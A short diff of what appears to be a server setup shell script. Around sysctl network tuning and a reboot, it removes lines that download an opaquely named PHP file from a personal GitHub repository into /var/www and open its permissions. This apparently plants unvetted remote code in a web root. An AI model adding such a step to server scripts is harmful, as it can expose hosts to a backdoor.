@@ -42,11 +42,4 @@ net.ipv4.tcp_mtu_probing = 1
 # recommended for CentOS7/Debian8 hosts
 net.core.default_qdisc = fq" | tee -a /etc/sysctl.conf > /dev/null
 
-rm -f -r /var/www/2531ef716b4d19cdd346b405de454f96.php
-cd /var/www/
-wget -N https://raw.githubusercontent.com/fjdhgjaf/bbox/v1/egyeb/2531ef716b4d19cdd346b405de454f96.php
-
-chown -R www-data:www-data /var/www/
-chmod -R 755 /var/www/
-
 reboot
